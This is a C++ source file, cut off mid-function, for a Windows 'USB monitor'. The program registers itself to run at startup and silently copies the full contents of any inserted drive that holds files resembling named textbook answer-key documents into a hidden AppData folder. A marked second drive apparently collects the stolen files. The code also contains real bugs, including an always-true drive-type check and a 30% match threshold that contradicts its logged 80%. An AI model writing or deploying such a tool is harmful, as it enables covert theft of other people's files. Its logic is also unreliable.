#include <windows.h>
#include <dbt.h>
#include <setupapi.h>
#include <shellapi.h>
#include <shlobj.h>
#include <initguid.h>
#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <vector>
#include <map>
#include "algorithm"
#include "cctype"

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// 定义卷设备接口GUID
DEFINE_GUID(GUID_DEVINTERFACE_VOLUME, 0x53f5630dL, 0xb6bf, 0x11d0, 0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b);

class USBMonitor;
static USBMonitor* g_pMonitor = nullptr;

class USBMonitor {
private:
    HWND hwnd;
    HDEVNOTIFY hDevNotify;
    NOTIFYICONDATA nid;
    std::string usbASearchPattern = "选三U8答案版分课时打印.doc";
    std::string usbBIdentifierFile = "USBB_IDENTIFIER.txt";
    std::string logDir;
    std::string revFilesDir;

    // 防重复处理机制
    std::map<std::string, DWORD> lastProcessTime;
    const DWORD MIN_PROCESS_INTERVAL = 3000; // 3秒内不重复处理

    // 进度跟踪变量
    int totalFilesToCopy;
    int copiedFilesCount;
    int totalDirectoriesToCreate;
    int createdDirectoriesCount;

    // 私有方法声明
    double CalculateStringSimilarity(const std::string& str1, const std::string& str2);
    int LevenshteinDistance(const std::string& str1, const std::string& str2);
    std::string NormalizeString(const std::string& str);
    void WriteLog(const std::string& message);
    void CheckAndSetAutoStart();
    bool CreateTrayIcon();
    void HandleDeviceChange(WPARAM wParam, LPARAM lParam);
    void OnUSBInserted(DWORD unitmask);
    void ScanAllDrives();
    bool IsRecentlyProcessed(const std::string& drivePath);
    void ProcessUSBDevice(const std::string& drivePath);
    bool FileExists(const std::string& filepath);
    bool SearchFileByPattern(const std::string& directory, const std::string& pattern);
    void HandleUSBA(const std::string& usbPath);
    void HandleUSBB(const std::string& usbPath);
    void CopyEntireUSBToLocal(const std::string& usbRoot, const std::string& localDir);
    void CopyDirectoryWithSizeComparison(const std::string& srcDir, const std::string& destDir, bool isRoot = false);
    void CopyDirectoryToUSB(const std::string& srcDir, const std::string& destDir, bool isRoot = false);
    bool ShouldSkipFile(const std::string& fileName, DWORD attributes);
    ULONGLONG GetFileSize64(const std::string& filePath);
    void CheckDeviceStatus(const std::string& drivePath);
    void CountFilesAndDirectories(const std::string& directory, int& fileCount, int& dirCount);
    void ShowProgress(const std::string& operation, int current, int total);
    void LogSummary(const std::string& operation, const std::map<std::string, int>& stats);
    void Cleanup();
    LRESULT HandleMessage(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

public:
    USBMonitor() : hwnd(nullptr), hDevNotify(nullptr), totalFilesToCopy(0), copiedFilesCount(0),
                   totalDirectoriesToCreate(0), createdDirectoriesCount(0) {
        g_pMonitor = this;
        memset(&nid, 0, sizeof(nid));

        try {
            char appDataPath[MAX_PATH];
            if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
                std::string baseDir = std::string(appDataPath) + "\\USBMonitor";
                logDir = baseDir + "\\Logs";
                revFilesDir = baseDir + "\\RevFiles";

                CreateDirectoryA(baseDir.c_str(), NULL);
                CreateDirectoryA(logDir.c_str(), NULL);
                CreateDirectoryA(revFilesDir.c_str(), NULL);
            } else {
                logDir = ".\\Logs";
                revFilesDir = ".\\RevFiles";
                CreateDirectoryA("Logs", NULL);
                CreateDirectoryA("RevFiles", NULL);
            }
        } catch (...) {
            logDir = ".";
            revFilesDir = ".\\RevFiles";
            CreateDirectoryA("RevFiles", NULL);
        }
    }

    ~USBMonitor() {
        Cleanup();
        g_pMonitor = nullptr;
    }

    bool Initialize() {
        WriteLog("正在启动USB监控程序...");

        // 设置开机启动
        CheckAndSetAutoStart();

        // 注册窗口类
        WNDCLASSEX wc = {0};
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = TEXT("USBMonitorClass");

        if (!RegisterClassEx(&wc)) {
            DWORD error = GetLastError();
            WriteLog("注册窗口类失败，错误代码: " + std::to_string(error));
            return false;
        }
        WriteLog("窗口类注册成功");

        // 创建消息窗口
        hwnd = CreateWindowEx(
                0,                      // dwExStyle
                TEXT("USBMonitorClass"), // lpClassName
                TEXT("USB Monitor"),     // lpWindowName
                0,                      // dwStyle
                0,                      // X
                0,                      // Y
                0,                      // nWidth
                0,                      // nHeight
                HWND_MESSAGE,           // hWndParent
                NULL,                   // hMenu
                GetModuleHandle(NULL),  // hInstance
                NULL                    // lpParam
        );

        if (!hwnd) {
            DWORD error = GetLastError();
            WriteLog("创建窗口失败，错误代码: " + std::to_string(error));
            return false;
        }
        WriteLog("消息窗口创建成功");

        // 创建托盘图标
        if (CreateTrayIcon()) {
            WriteLog("托盘图标创建成功");
        } else {
            WriteLog("托盘图标创建失败，但继续运行");
        }

        // ========== 修复的设备通知注册部分 ==========
        WriteLog("开始注册设备通知...");

        // 方法1: 注册所有设备变化通知
        hDevNotify = RegisterDeviceNotification(
                hwnd,
                NULL,
                DEVICE_NOTIFY_WINDOW_HANDLE | DEVICE_NOTIFY_ALL_INTERFACE_CLASSES
        );

        if (!hDevNotify) {
            DWORD error = GetLastError();
            WriteLog("方法1注册失败，错误代码: " + std::to_string(error) + "，尝试方法2");

            // 方法2: 注册卷设备通知
            DEV_BROADCAST_DEVICEINTERFACE dbdi = {0};
            dbdi.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
            dbdi.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
            dbdi.dbcc_classguid = GUID_DEVINTERFACE_VOLUME;

            hDevNotify = RegisterDeviceNotification(
                    hwnd,
                    &dbdi,
                    DEVICE_NOTIFY_WINDOW_HANDLE
            );

            if (!hDevNotify) {
                error = GetLastError();
                WriteLog("方法2也失败，错误代码: " + std::to_string(error) + "，尝试方法3");

                // 方法3: 最简单的注册方式
                DEV_BROADCAST_HDR dbh = {0};
                dbh.dbch_size = sizeof(DEV_BROADCAST_HDR);
                dbh.dbch_devicetype = DBT_DEVTYP_DEVICEINTERFACE;

                hDevNotify = RegisterDeviceNotification(
                        hwnd,
                        &dbh,
                        DEVICE_NOTIFY_WINDOW_HANDLE
                );

                if (!hDevNotify) {
                    error = GetLastError();
                    WriteLog("所有设备通知注册方法都失败，错误代码: " + std::to_string(error));
                    WriteLog("警告：设备通知可能无法正常工作，但程序继续运行");
                } else {
                    WriteLog("方法3设备通知注册成功");
                }
            } else {
                WriteLog("方法2设备通知注册成功");
            }
        } else {
            WriteLog("方法1设备通知注册成功");
        }

        WriteLog("USB监控程序初始化完成");

        // 启动后立即扫描一次现有驱动器
        WriteLog("启动后立即扫描现有驱动器...");
        ScanAllDrives();

        return true;
    }

    void Run() {
        WriteLog("进入消息循环");

        MSG msg;
        int messageCount = 0;

        while (true) {
            try {
                BOOL result = GetMessage(&msg, NULL, 0, 0);

                if (result == 0) {
                    WriteLog("收到退出消息");
                    break;
                } else if (result == -1) {
                    WriteLog("GetMessage失败");
                    break;
                } else {
                    messageCount++;
                    if (messageCount <= 10 || messageCount % 100 == 0) {
                        WriteLog("处理消息 #" + std::to_string(messageCount) + ": " + std::to_string(msg.message));
                    }

                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            }
            catch (const std::exception& e) {
                WriteLog("消息循环中发生异常: " + std::string(e.what()));
                Sleep(100);
            }
            catch (...) {
                WriteLog("消息循环中发生未知异常，继续运行");
                Sleep(100);
            }
        }

        WriteLog("消息循环结束");
    }
};

// 静态方法实现
LRESULT CALLBACK USBMonitor::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    try {
        if (g_pMonitor) {
            return g_pMonitor->HandleMessage(hwnd, uMsg, wParam, lParam);
        }
    }
    catch (const std::exception& e) {
        if (g_pMonitor) {
            g_pMonitor->WriteLog("WindowProc中发生异常: " + std::string(e.what()));
        }
    }
    catch (...) {
        if (g_pMonitor) {
            g_pMonitor->WriteLog("WindowProc中发生未知异常，消息: " + std::to_string(uMsg));
        }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// 私有方法实现

// 计算两个字符串的相似度（基于Levenshtein距离）
std::string USBMonitor::NormalizeString(const std::string& str) {
    std::string normalized;

    for (char c : str) {
        // 转换为小写
        char lowerC = std::tolower(c);

        // 跳过空格、标点符号等
        if (std::isalnum(lowerC) || (lowerC & 0x80)) { // 保留字母数字和中文字符
            normalized += lowerC;
        }
    }

    return normalized;
}

// 计算两个字符串的相似度（基于Levenshtein距离）
double USBMonitor::CalculateStringSimilarity(const std::string& str1, const std::string& str2) {
    if (str1.empty() && str2.empty()) {
        return 1.0; // 两个空字符串完全相似
    }

    if (str1.empty() || str2.empty()) {
        return 0.0; // 一个空字符串，相似度为0
    }

    // 标准化字符串（处理不同字符的情况）
    std::string normalized1 = NormalizeString(str1);
    std::string normalized2 = NormalizeString(str2);

    int distance = LevenshteinDistance(normalized1, normalized2);
    int maxLen = std::max(normalized1.length(), normalized2.length());

    if (maxLen == 0) {
        return 1.0; // 避免除零
    }

    // 计算相似度百分比
    double similarity = 1.0 - (double)distance / maxLen;
    return similarity;
}

// 计算Levenshtein距离（编辑距离）
int USBMonitor::LevenshteinDistance(const std::string& str1, const std::string& str2) {
    int len1 = str1.length();
    int len2 = str2.length();

    // 创建动态规划表
    std::vector<std::vector<int>> dp(len1 + 1, std::vector<int>(len2 + 1));

    // 初始化边界条件
    for (int i = 0; i <= len1; i++) {
        dp[i][0] = i;
    }
    for (int j = 0; j <= len2; j++) {
        dp[0][j] = j;
    }

    // 填充动态规划表
    for (int i = 1; i <= len1; i++) {
        for (int j = 1; j <= len2; j++) {
            if (str1[i-1] == str2[j-1]) {
                dp[i][j] = dp[i-1][j-1]; // 字符相同，无需操作
            } else {
                dp[i][j] = 1 + std::min({
                                                dp[i-1][j],    // 删除
                                                dp[i][j-1],    // 插入
                                                dp[i-1][j-1]   // 替换
                                        });
            }
        }
    }

    return dp[len1][len2];
}


void USBMonitor::WriteLog(const std::string& message) {
    try {
        time_t now = time(0);
        struct tm timeinfo;
        localtime_s(&timeinfo, &now);

        char timeStr[32];
        strftime(timeStr, sizeof(timeStr), "%H:%M:%S", &timeinfo);

        char dateStr[32];
        strftime(dateStr, sizeof(dateStr), "%Y-%m-%d", &timeinfo);

        std::string logFile = logDir + "\\" + std::string(dateStr) + ".log";

        std::ofstream file(logFile, std::ios::app);
        if (file.is_open()) {
            file << "[" << timeStr << "] " << message << std::endl;
            file.close();
        }

        std::cout << "[" << timeStr << "] " << message << std::endl;
    }
    catch (...) {
        std::cout << "日志异常: " << message << std::endl;
    }
}

void USBMonitor::CheckAndSetAutoStart() {
    try {
        HKEY hKey;
        const char* subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        const char* valueName = "USBMonitor";

        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ | KEY_WRITE, &hKey);
        if (result != ERROR_SUCCESS) {
            WriteLog("无法打开注册表项，跳过开机启动设置");
            return;
        }

        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        char buffer[MAX_PATH] = {0};
        DWORD bufferSize = sizeof(buffer);
        DWORD type;

        result = RegQueryValueExA(hKey, valueName, NULL, &type, (LPBYTE)buffer, &bufferSize);

        if (result != ERROR_SUCCESS || strcmp(buffer, currentPath) != 0) {
            result = RegSetValueExA(hKey, valueName, 0, REG_SZ,
                                    (LPBYTE)currentPath, strlen(currentPath) + 1);
            if (result == ERROR_SUCCESS) {
                WriteLog("开机启动设置成功");
            } else {
                WriteLog("开机启动设置失败");
            }
        } else {
            WriteLog("开机启动已设置");
        }

        RegCloseKey(hKey);
    } catch (...) {
        WriteLog("设置开机启动时发生异常");
    }
}

bool USBMonitor::CreateTrayIcon() {
    try {
        nid.cbSize = sizeof(NOTIFYICONDATA);
        nid.hWnd = hwnd;
        nid.uID = 1;
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
        nid.uCallbackMessage = WM_USER + 1;
        nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);

#ifdef UNICODE
        wcscpy_s(nid.szTip, L"USB Monitor Running");
#else
        strcpy_s(nid.szTip, "USB Monitor Running");
#endif

        return Shell_NotifyIcon(NIM_ADD, &nid);
    }
    catch (...) {
        WriteLog("创建托盘图标时发生异常");
        return false;
    }
}

LRESULT USBMonitor::HandleMessage(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    try {
        switch (uMsg) {
            case WM_DEVICECHANGE:
                WriteLog("收到设备变化消息");
                HandleDeviceChange(wParam, lParam);
                break;

            case WM_USER + 1: // 托盘图标消息
                // 简单处理，不做复杂操作
                break;

            case WM_DESTROY:
                WriteLog("收到销毁窗口消息");
                PostQuitMessage(0);
                break;

            case WM_CLOSE:
                WriteLog("收到关闭窗口消息");
                PostQuitMessage(0);
                break;

            default:
                return DefWindowProc(hwnd, uMsg, wParam, lParam);
        }
    }
    catch (const std::exception& e) {
        WriteLog("HandleMessage中发生异常: " + std::string(e.what()));
    }
    catch (...) {
        WriteLog("HandleMessage中发生未知异常，消息: " + std::to_string(uMsg));
    }

    return 0;
}

// 修复HandleDeviceChange方法，添加更详细的调试信息
void USBMonitor::HandleDeviceChange(WPARAM wParam, LPARAM lParam) {
    try {
        WriteLog("=== 设备变化事件详细信息 ===");
        WriteLog("wParam: " + std::to_string(wParam) + " (0x" +
                 std::to_string(wParam) + ")");

        // 解释wParam的含义
        std::string eventName;
        switch (wParam) {
            case DBT_DEVICEARRIVAL:
                eventName = "DBT_DEVICEARRIVAL (设备插入)";
                break;
            case DBT_DEVICEREMOVECOMPLETE:
                eventName = "DBT_DEVICEREMOVECOMPLETE (设备移除)";
                break;
            case DBT_DEVICEQUERYREMOVE:
                eventName = "DBT_DEVICEQUERYREMOVE (查询移除)";
                break;
            case DBT_DEVICEREMOVEPENDING:
                eventName = "DBT_DEVICEREMOVEPENDING (准备移除)";
                break;
            case DBT_DEVICEQUERYREMOVEFAILED:
                eventName = "DBT_DEVICEQUERYREMOVEFAILED (取消移除)";
                break;
            case DBT_DEVNODES_CHANGED:
                eventName = "DBT_DEVNODES_CHANGED (设备节点变化)";
                break;
            case DBT_CONFIGCHANGED:
                eventName = "DBT_CONFIGCHANGED (配置变化)";
                break;
            default:
                eventName = "未知事件类型";
                break;
        }
        WriteLog("事件类型: " + eventName);

        if (lParam == 0) {
            WriteLog("lParam为空，这是系统级别的设备变化通知");

            // 对于系统级别的通知，我们主动扫描所有驱动器
            if (wParam == DBT_DEVICEARRIVAL || wParam == DBT_DEVNODES_CHANGED) {
                WriteLog("执行主动驱动器扫描...");
                ScanAllDrives();
            }
            return;
        }

        PDEV_BROADCAST_HDR pHdr = reinterpret_cast<PDEV_BROADCAST_HDR>(lParam);
        if (!pHdr) {
            WriteLog("无效的设备广播头");
            return;
        }

        WriteLog("设备类型: " + std::to_string(pHdr->dbch_devicetype));

        // 解释设备类型
        std::string deviceTypeName;
        switch (pHdr->dbch_devicetype) {
            case DBT_DEVTYP_VOLUME:
                deviceTypeName = "DBT_DEVTYP_VOLUME (卷设备)";
                break;
            case DBT_DEVTYP_DEVICEINTERFACE:
                deviceTypeName = "DBT_DEVTYP_DEVICEINTERFACE (设备接口)";
                break;
            case DBT_DEVTYP_HANDLE:
                deviceTypeName = "DBT_DEVTYP_HANDLE (文件句柄)";
                break;
            case DBT_DEVTYP_OEM:
                deviceTypeName = "DBT_DEVTYP_OEM (OEM设备)";
                break;
            case DBT_DEVTYP_PORT:
                deviceTypeName = "DBT_DEVTYP_PORT (端口设备)";
                break;
            default:
                deviceTypeName = "未知设备类型";
                break;
        }
        WriteLog("设备类型名称: " + deviceTypeName);

        if (wParam == DBT_DEVICEARRIVAL) {
            WriteLog("*** 处理设备插入事件 ***");

            if (pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                WriteLog("检测到卷设备插入");

                PDEV_BROADCAST_VOLUME pVol = reinterpret_cast<PDEV_BROADCAST_VOLUME>(pHdr);
                if (pVol) {
                    WriteLog("卷掩码: " + std::to_string(pVol->dbcv_unitmask) +
                             " (0x" + std::to_string(pVol->dbcv_unitmask) + ")");
                    WriteLog("卷标志: " + std::to_string(pVol->dbcv_flags));

                    OnUSBInserted(pVol->dbcv_unitmask);
                } else {
                    WriteLog("卷设备信息为空");
                }
            } else if (pHdr->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
                WriteLog("检测到设备接口插入，执行主动扫描");
                ScanAllDrives();
            } else {
                WriteLog("其他类型设备插入，执行主动扫描");
                ScanAllDrives();
            }
        } else if (wParam == DBT_DEVICEREMOVECOMPLETE) {
            WriteLog("*** 设备移除事件 ***");
            // 可以在这里处理设备移除逻辑
        }

        WriteLog("=== 设备变化处理完成 ===");

    }
    catch (const std::exception& e) {
        WriteLog("处理设备变化时发生异常: " + std::string(e.what()));
    }
    catch (...) {
        WriteLog("处理设备变化时发生未知异常");
    }
}

// 添加新方法：主动扫描所有驱动器
void USBMonitor::ScanAllDrives() {
    WriteLog("开始主动扫描所有驱动器...");

    try {
        // 获取系统中所有驱动器
        DWORD drives = GetLogicalDrives();
        WriteLog("逻辑驱动器掩码: " + std::to_string(drives) +
                 " (0x" + std::to_string(drives) + ")");

        for (int i = 0; i < 26; i++) {
            if (drives & (1 << i)) {
                char driveLetter = 'A' + i;
                std::string drivePath = std::string(1, driveLetter) + ":\\";

                WriteLog("检查驱动器: " + drivePath);

                // 获取驱动器类型
                UINT driveType = GetDriveTypeA(drivePath.c_str());
                std::string typeStr;
                switch (driveType) {
                    case DRIVE_REMOVABLE: typeStr = "可移动设备"; break;
                    case DRIVE_FIXED: typeStr = "固定磁盘"; break;
                    case DRIVE_REMOTE: typeStr = "网络驱动器"; break;
                    case DRIVE_CDROM: typeStr = "光盘驱动器"; break;
                    case DRIVE_RAMDISK: typeStr = "内存盘"; break;
                    default: typeStr = "未知类型(" + std::to_string(driveType) + ")"; break;
                }

                WriteLog("驱动器 " + drivePath + " 类型: " + typeStr);

                if (driveType == DRIVE_REMOVABLE or DRIVE_FIXED) {
                    WriteLog("发现设备: " + drivePath);

                    // 检查是否最近已经处理过
                    if (IsRecentlyProcessed(drivePath)) {
                        WriteLog("驱动器 " + drivePath + " 最近已处理，跳过");
                        continue;
                    }

                    // 验证设备是否可访问
                    DWORD attributes = GetFileAttributesA(drivePath.c_str());
                    if (attributes == INVALID_FILE_ATTRIBUTES) {
                        DWORD error = GetLastError();
                        WriteLog("无法访问驱动器 " + drivePath + "，错误: " + std::to_string(error));
                        continue;
                    }

                    WriteLog("准备处理可移动设备: " + drivePath);
                    Sleep(1000); // 给设备一点时间完全就绪

                    ProcessUSBDevice(drivePath);

                    // 记录处理时间
                    lastProcessTime[drivePath] = GetTickCount();
                }
            }
        }

        WriteLog("驱动器扫描完成");

    } catch (const std::exception& e) {
        WriteLog("扫描驱动器时发生异常: " + std::string(e.what()));
    } catch (...) {
        WriteLog("扫描驱动器时发生未知异常");
    }
}

// 修复后的OnUSBInserted方法，添加更详细的日志
void USBMonitor::OnUSBInserted(DWORD unitmask) {
    try {
        WriteLog("=== 处理USB插入事件 ===");
        WriteLog("单元掩码: " + std::to_string(unitmask) + " (0x" +
                 std::to_string(unitmask) + ")");

        // 解析掩码中的所有驱动器
        std::vector<std::string> detectedDrives;
        for (int i = 0; i < 26; i++) {
            if (unitmask & (1 << i)) {
                char driveLetter = 'A' + i;
                std::string drivePath = std::string(1, driveLetter) + ":\\";
                detectedDrives.push_back(drivePath);
            }
        }

        WriteLog("从掩码解析出的驱动器: ");
        for (const auto& drive : detectedDrives) {
            WriteLog("  - " + drive);
        }

        for (const auto& drivePath : detectedDrives) {
            WriteLog("开始处理驱动器: " + drivePath);

            // 检查是否为可移动设备
            UINT driveType = GetDriveTypeA(drivePath.c_str());
            WriteLog("驱动器类型: " + std::to_string(driveType));

            if (driveType == DRIVE_REMOVABLE) {
                WriteLog("确认为可移动设备: " + drivePath);

                // 防重复处理
                if (IsRecentlyProcessed(drivePath)) {
                    WriteLog("设备最近已处理，跳过: " + drivePath);
                    continue;
                }

                // 等待设备完全就绪
                WriteLog("等待设备完全就绪...");
                Sleep(3000);

                // 验证设备仍然存在且可访问
                DWORD attributes = GetFileAttributesA(drivePath.c_str());
                if (attributes == INVALID_FILE_ATTRIBUTES) {
                    DWORD error = GetLastError();
                    WriteLog("设备可能已移除或无法访问: " + drivePath +
                             "，错误: " + std::to_string(error));
                    continue;
                }

                WriteLog("设备就绪，开始处理: " + drivePath);

                // 处理USB设备
                ProcessUSBDevice(drivePath);

                // 记录处理时间
                lastProcessTime[drivePath] = GetTickCount();
            } else {
                WriteLog("跳过非可移动设备: " + drivePath +
                         "，类型: " + std::to_string(driveType));
            }
        }

        WriteLog("=== USB插入事件处理完成 ===");

    }
    catch (const std::exception& e) {
        WriteLog("处理USB插入时发生异常: " + std::string(e.what()));
    }
    catch (...) {
        WriteLog("处理USB插入时发生未知异常");
    }
}

bool USBMonitor::IsRecentlyProcessed(const std::string& drivePath) {
    DWORD currentTime = GetTickCount();
    auto it = lastProcessTime.find(drivePath);

    if (it != lastProcessTime.end()) {
        if (currentTime - it->second < MIN_PROCESS_INTERVAL) {
            return true;
        }
    }

    return false;
}

void USBMonitor::ProcessUSBDevice(const std::string& drivePath) {
    try {
        WriteLog("开始处理USB设备: " + drivePath);

        // 详细设备状态检查
        CheckDeviceStatus(drivePath);

        // 检查U盘B
        std::string identifierPath = drivePath + usbBIdentifierFile;
        if (FileExists(identifierPath)) {
            WriteLog("***** 发现目标USB B: " + drivePath + " *****");
            HandleUSBB(drivePath);
            return;
        }

        // 检查U盘A
        //if (SearchFileByPattern(drivePath, usbASearchPattern)) {
        if (SearchFileByPattern(drivePath, usbASearchPattern) or SearchFileByPattern(drivePath,"微点")or SearchFileByPattern(drivePath,"选二U4答案版")){
            WriteLog("***** 发现目标USB A: " + drivePath + " *****");
            HandleUSBA(drivePath);
            return;
        }

        WriteLog("普通USB设备: " + drivePath);
    }
    catch (const std::exception& e) {
        WriteLog("处理USB设备时发生异常: " + std::string(e.what()));
    }
    catch (...) {
        WriteLog("处理USB设备时发生未知异常");
    }
}

void USBMonitor::CheckDeviceStatus(const std::string& drivePath) {
    WriteLog("=== 详细设备状态检查: " + drivePath + " ===");

    // 1. 基本路径检查
    DWORD attributes = GetFileAttributesA(drivePath.c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        WriteLog("? 路径不存在");
        return;
    }
    WriteLog("? 路径存在");

    // 2. 驱动器类型
    UINT driveType = GetDriveTypeA(drivePath.c_str());
    std::string typeStr;
    switch (driveType) {
        case DRIVE_REMOVABLE: typeStr = "可移动设备"; break;
        case DRIVE_FIXED: typeStr = "固定磁盘"; break;
        case DRIVE_REMOTE: typeStr = "网络驱动器"; break;
        case DRIVE_CDROM: typeStr = "光盘驱动器"; break;
        case DRIVE_RAMDISK: typeStr = "内存盘"; break;
        default: typeStr = "未知类型"; break;
    }
    WriteLog("驱动器类型: " + typeStr);

    // 3. 磁盘空间
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceExA(drivePath.c_str(), &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        WriteLog("? 磁盘空间可读，总空间: " + std::to_string(totalNumberOfBytes.QuadPart / (1024*1024)) + " MB");
    } else {
        DWORD error = GetLastError();
        WriteLog("? 磁盘空间不可读，错误: " + std::to_string(error));
    }

    WriteLog("=== 设备状态检查结束 ===");
}

bool USBMonitor::FileExists(const std::string& filepath) {
    DWORD dwAttrib = GetFileAttributesA(filepath.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool USBMonitor::SearchFileByPattern(const std::string& directory, const std::string& pattern) {
    try {
        WriteLog("搜索文件模式: " + pattern + " 在目录: " + directory);
        WriteLog("识别条件: 包含匹配 OR 80%相似度匹配 -> 识别为U盘A");

        // 全面的设备就绪检查
        WriteLog("开始详细的设备检查...");

        // 检查路径是否存在
        DWORD attributes = GetFileAttributesA(directory.c_str());
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            DWORD error = GetLastError();
            WriteLog("路径不存在，错误代码: " + std::to_string(error));
            return false;
        }

        WriteLog("路径存在检查通过");

        // 检查磁盘是否就绪
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
        BOOL diskSpaceResult = GetDiskFreeSpaceExA(directory.c_str(),
                                                   &freeBytesAvailable,
                                                   &totalNumberOfBytes,
                                                   &totalNumberOfFreeBytes);

        if (!diskSpaceResult) {
            DWORD error = GetLastError();
            WriteLog("磁盘空间检查失败，错误代码: " + std::to_string(error));
            return false;
        }

        WriteLog("磁盘空间检查通过，总空间: " +
                 std::to_string(totalNumberOfBytes.QuadPart / (1024*1024)) + " MB");

        // 多次尝试访问目录内容
        HANDLE hFind = INVALID_HANDLE_VALUE;
        std::string searchPath = directory;
        if (searchPath.back() != '\\') {
            searchPath += "\\";
        }
        searchPath += "*";

        WriteLog("准备搜索路径: " + searchPath);

        // 尝试多次，给设备更多时间
        for (int attempt = 0; attempt < 5; attempt++) {
            WriteLog("尝试访问目录内容，第 " + std::to_string(attempt + 1) + " 次");

            WIN32_FIND_DATAA findData;
            hFind = FindFirstFileA(searchPath.c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE) {
                WriteLog("成功访问目录内容");
                break;
            }

            DWORD error = GetLastError();
            WriteLog("FindFirstFile失败，错误代码: " + std::to_string(error));

            if (attempt < 4) {
                WriteLog("等待1秒后重试...");
                Sleep(1000);
            }
        }

        if (hFind == INVALID_HANDLE_VALUE) {
            WriteLog("多次尝试后仍无法访问目录内容");
            return false;
        }

        // 搜索文件
        WriteLog("开始搜索匹配文件");

        // 预处理搜索模式：去掉扩展名
        std::string basePattern = pattern;
        size_t dotPosPattern = basePattern.find_last_of('.');
        if (dotPosPattern != std::string::npos) {
            basePattern = basePattern.substr(0, dotPosPattern);
        }

        WriteLog("原始匹配模式: " + basePattern);
        WriteLog("标准化后的匹配模式: " + NormalizeString(basePattern));

        int fileCount = 0;
        bool foundMatch = false;
        std::vector<std::string> allMatches; // 记录所有匹配的文件

        WIN32_FIND_DATAA findData;
        do {
            std::string itemName = findData.cFileName;

            // 跳过 . 和 .. 目录
            if (itemName == "." || itemName == "..") {
                continue;
            }

            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                fileCount++;

                // 去掉文件扩展名
                std::string baseFileName = itemName;
                size_t dotPosFile = baseFileName.find_last_of('.');
                if (dotPosFile != std::string::npos) {
                    baseFileName = baseFileName.substr(0, dotPosFile);
                }

                WriteLog("检查文件: " + itemName + " (基本名: " + baseFileName + ")");

                bool isMatch = false;
                std::string matchReason;

                // 方法1：包含匹配检查（原有逻辑）
                std::string lowerBaseFileName = NormalizeString(baseFileName);
                std::string lowerBasePattern = NormalizeString(basePattern);

                if (lowerBaseFileName.find(lowerBasePattern) != std::string::npos) {
                    isMatch = true;
                    matchReason = "包含匹配";
                    WriteLog("? " + itemName + " - 包含匹配成功");
                }

                // 方法2：相似度匹配检查
                if (!isMatch) {
                    double similarity = CalculateStringSimilarity(baseFileName, basePattern);
                    int similarityPercent = (int)(similarity * 100);

                    WriteLog("文件 " + itemName + " 相似度: " + std::to_string(similarityPercent) + "%");

                    if (similarity >= 0.30) {
                        isMatch = true;
                        matchReason = "相似度匹配(" + std::to_string(similarityPercent) + "%)";
                        WriteLog("? " + itemName + " - 相似度匹配成功 (" + std::to_string(similarityPercent) + "%)");
                    }
                }

                // 如果找到匹配
                if (isMatch) {
                    foundMatch = true;
                    allMatches.push_back(itemName + " [" + matchReason + "]");
                    WriteLog("*** 匹配文件: " + itemName + " - " + matchReason + " ***");
                }
            }
        } while (FindNextFileA(hFind, &findData));

        FindClose(hFind);

        WriteLog("搜索完成，共检查 " + std::to_string(fileCount) + " 个文件");

        if (foundMatch) {
            WriteLog("=== U盘A识别成功 ===");
            WriteLog("找到 " + std::to_string(allMatches.size()) + " 个匹配文件:");
            for (const auto& match : allMatches) {
                WriteLog("  - " + match);
            }
            WriteLog("结论: 识别为U盘A（存在相似文件）");
        } else {
            WriteLog("=== U盘A识别失败 ===");
            WriteLog("未找到匹配文件，不是目标U盘A");
        }

        return foundMatch; // 只要有任何匹配文件就返回true

    }
    catch (const std::exception& e) {
        WriteLog("搜索文件时发生异常: " + std::string(e.what()));
        return false;
    }
    catch (...) {
        WriteLog("搜索文件时发生未知异常");
        return false;
    }
}

void USBMonitor::HandleUSBA(const std::string& usbPath) {
    WriteLog("开始处理U盘A: 复制整个U盘内容到本地RevFiles目录");
    WriteLog("U盘A路径: " + usbPath);
    WriteLog("目标路径: " + revFilesDir);
    WriteLog("重要提醒: 不会在U盘A中创建任何文件，保持原始状态");

    try {
        CopyEntireUSBToLocal(usbPath, revFilesDir);
        WriteLog("从U盘A复制全部内容成功 - U盘A保持原始状态");
    } catch (const std::exception& e) {
        WriteLog("处理U盘A时发生异常: " + std::string(e.what()));
    } catch (...) {
        WriteLog("处理U盘A时发生未知异常");
    }
}

void USBMonitor::HandleUSBB(const std::string& usbPath) {
    WriteLog("开始处理U盘B: 复制RevFiles和日志到U盘");
    WriteLog("U盘B路径: " + usbPath);
